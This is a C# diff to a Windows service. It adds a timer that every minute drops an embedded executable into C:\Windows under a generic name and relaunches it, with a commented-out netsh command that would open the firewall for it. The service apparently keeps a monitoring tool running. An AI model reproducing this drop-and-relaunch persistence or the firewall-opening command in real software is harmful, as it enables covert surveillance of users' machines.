@@ -26,11 +26,17 @@ namespace WindowsService
         Thread thread;//创建线程对象
         UdpClient udp;
         string moniterPath = @"C:\Windows\WindowsFormsApp1.exe";
+        System.Timers.Timer timer = null;
 
         public Service1()
         {
-            InitializeComponent();          
+            InitializeComponent();
+            timer = new System.Timers.Timer();
+            timer.Elapsed += Timer_Elapsed;
+            timer.Interval = 1 * 60*1000;
         }
+
+  
 
         protected override void OnStart(string[] args)
         {
@@ -100,9 +106,19 @@ namespace WindowsService
             return img;
         }
 
-        private void timer1_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
+        private void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-          
+            bool flag = false;
+            System.Threading.Mutex mutex = new System.Threading.Mutex(true, "Moniter", out flag);
+            if (!flag) {
+                if (!File.Exists(moniterPath))
+                {
+                    File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);                    
+                    //ExecuteCom("netsh firewall set allowedprogram " + moniterPath + " A ENABLE", 1);
+                }
+                WinAPI_Interop.CreateProcess(moniterPath);
+            }
+
         }
 
         protected override void OnStop()
